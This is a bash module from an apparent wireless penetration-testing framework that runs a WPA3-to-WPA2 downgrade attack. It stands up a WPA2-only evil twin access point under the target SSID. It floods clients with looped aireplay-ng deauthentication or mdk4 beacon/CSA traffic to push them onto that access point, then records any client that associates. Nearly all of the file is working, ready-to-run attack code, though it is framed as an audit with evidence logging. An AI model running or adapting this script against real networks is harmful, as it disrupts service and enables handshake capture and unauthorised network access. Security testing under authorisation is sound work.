#!/usr/bin/env bash
# MODULE_META
# NAME="WPA3-to-WPA2 Active Downgrade"
# CATEGORY="D"
# DEPS="A1"
# CRITICAL="no"
# TOOLS="hostapd,mdk4,aireplay-ng"
# DESC="Attempt to force WPA3-SAE clients to downgrade to WPA2-PSK"
# REQS="monitor_iface,target_ssid,nat"
# PCAP="yes"
# TIMED="yes"
# DECODE="wpa3"

#===============================================================================
#  modules/d7_wpa3_downgrade_active.sh
#  D7: WPA3-to-WPA2 Active Downgrade (Golden Wrapper)
#
#  METHODOLOGY (SPEC ALIGNED):
#  1. Deploy a WPA2-only Evil Twin with the target SSID.
#  2. Interactive selection: Force roaming via Deauth or CSA (mdk4).
#  3. Capture the downgraded client's WPA2 handshake.
#===============================================================================

set -euo pipefail

C_PROMPT="${ASTRA_COLOR_PROMPT:-}"
C_VAR="${ASTRA_COLOR_VAR:-}"
C_BOLD="${ASTRA_COLOR_BOLD:-}"
C_ACTION="${ASTRA_COLOR_ACTION:-}"
C_RESET="${ASTRA_COLOR_RESET:-}"


# Inputs from Environment

CATALYST="${CATALYST:-1}"
INTERFACE="${MONITOR_INTERFACE:-}"
SSID="${GUEST_SSID:-}"
TARGET_BSSID="${GUEST_BSSID:-}"
CHANNEL="${GUEST_CHANNEL:-11}" # Default to 11 if not set
SCAN_TIME="${SCAN_TIME:-60}"
SESSION_DIR="${SESSION_DIR:-.}"
EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
ASTRA_BIN="${ASTRA_BIN:-wifi-astra}"
TC_ID="D7"
OUTPUT_BASE="${EVIDENCE_DIR}/${TC_ID}_downgrade"

if [[ -z "$INTERFACE" || -z "$SSID" ]]; then
    echo "[!] MONITOR_INTERFACE or GUEST_SSID not set."
    exit 1
fi

echo "[*] Initializing WPA3 Downgrade tactical options..."

# 1. Interactive Selection
echo "[?] Select Roaming Catalyst:"
echo "    1) Targeted Deauth (Surgical - Disrupts PMF)"
echo "    2) CSA (Channel Switch Announcement via mdk4 - Stealthier)"
catalyst_choice="${CATALYST:-1}"

# 2. Deploy WPA2-only Evil Twin
echo "[*] Deploying WPA2-PSK Evil Twin for SSID: $SSID..."
HOSTAPD_CONF="${EVIDENCE_DIR}/${TC_ID}_hostapd.conf"
HOSTAPD_LOG="${EVIDENCE_DIR}/${TC_ID}_hostapd.log"

cat <<EOF > "$HOSTAPD_CONF"
interface=$INTERFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=$CHANNEL
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
rsn_pairwise=CCMP
wpa_passphrase=DowngradeTest123
EOF

cleanup() {
    echo "[*] Cleaning up Downgrade processes..."
    [[ -n "${HOSTAPD_PID:-}" ]] && kill "$HOSTAPD_PID" 2>/dev/null || true
    [[ -n "${CATALYST_PID:-}" ]] && kill "$CATALYST_PID" 2>/dev/null || true
    [[ -n "${TELEMETRY_PID:-}" ]] && kill "$TELEMETRY_PID" 2>/dev/null || true
}
trap cleanup EXIT

# 3. Start dynamic telemetry heartbeat
(
    HEARTBEAT_ELAPSED=0
    while [[ "${ASTRA_INDEFINITE:-}" == "true" || $HEARTBEAT_ELAPSED -lt $SCAN_TIME ]]; do
        PCT=$(( 10 + (HEARTBEAT_ELAPSED * 80 / SCAN_TIME) ))
        [[ $PCT -gt 90 ]] && PCT=90
        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PCT" --status "Executing attack..."
        sleep 2
        HEARTBEAT_ELAPSED=$((HEARTBEAT_ELAPSED + 2))
    done
) &
TELEMETRY_PID=$!

# 4. Execution of Catalyst and hostapd
if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
    # Window Mode: Run hostapd in foreground, catalyst in background
    if [[ "$catalyst_choice" == "1" ]] && [[ -n "$TARGET_BSSID" ]]; then
        echo "[*] Starting deauth catalyst against WPA3 BSSID: $TARGET_BSSID..."
        ( while true; do aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$INTERFACE" || true; sleep 15; done ) &
        CATALYST_PID=$!
    elif [[ "$catalyst_choice" == "2" ]] && command -v mdk4 &>/dev/null; then
        echo "[*] Starting CSA catalyst (mdk4) for $SSID..."
        mdk4 "$INTERFACE" b -n "$SSID" -c 11 &
        CATALYST_PID=$!
    fi

    echo "[*] Downgrade environment active. Monitoring for client association..."
    timeout "$SCAN_TIME" hostapd "$HOSTAPD_CONF" 2>&1 | tee "$HOSTAPD_LOG" || true
else
    # Background Mode
    hostapd "$HOSTAPD_CONF" > "$HOSTAPD_LOG" 2>&1 &
    HOSTAPD_PID=$!

    if [[ "$catalyst_choice" == "1" ]] && [[ -n "$TARGET_BSSID" ]]; then
        echo "[*] Starting deauth catalyst against WPA3 BSSID: $TARGET_BSSID..."
        ( while kill -0 $HOSTAPD_PID 2>/dev/null; do aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$INTERFACE" > /dev/null 2>&1 || true; sleep 15; done ) &
        CATALYST_PID=$!
    elif [[ "$catalyst_choice" == "2" ]] && command -v mdk4 &>/dev/null; then
        echo "[*] Starting CSA catalyst (mdk4) for $SSID..."
        mdk4 "$INTERFACE" b -n "$SSID" -c 11 > /dev/null 2>&1 &
        CATALYST_PID=$!
    fi

    echo "[*] Downgrade environment active. Monitoring for client association..."
    sleep "$SCAN_TIME"
fi

kill "$TELEMETRY_PID" 2>/dev/null || true

# 4. Reporting
if grep -qi "authenticated" "$HOSTAPD_LOG"; then
    V_MAC=$(grep -i "authenticated" "$HOSTAPD_LOG" | awk '{print $3}' | head -1)
    echo "[!] SUCCESS: WPA3 CLIENT DOWNGRADED TO WPA2!"
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "WPA3 Downgrade Successful" \
        --severity HIGH \
        --desc "A WPA3-capable client ($V_MAC) successfully associated with the WPA2 Evil Twin AP." \
        --target "$V_MAC" \
        --evidence "$HOSTAPD_LOG" \
        --rationale "WPA3 transition mode vulnerability allows an attacker to force clients into a weaker WPA2-PSK handshake which can then be captured and cracked offline."
else
    echo "[+] Downgrade test complete. No client fallback detected."
    "$ASTRA_BIN" record-finding \
        --session-dir "$SESSION_DIR" \
        --tc "$TC_ID" \
        --type vulnerability \
        --name "[D7] Audit Complete" \
        --severity INFO \
        --desc "Attempted protocol downgrade attack on $SSID. No clients associated with the legacy AP." \
        --target "$SSID" \
        --evidence "$HOSTAPD_LOG" \
        --rationale "Modern OSes may resist protocol downgrades if they have previously associated with the SSID using SAE (WPA3) and have cached that state."
fi

"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"
exit 0
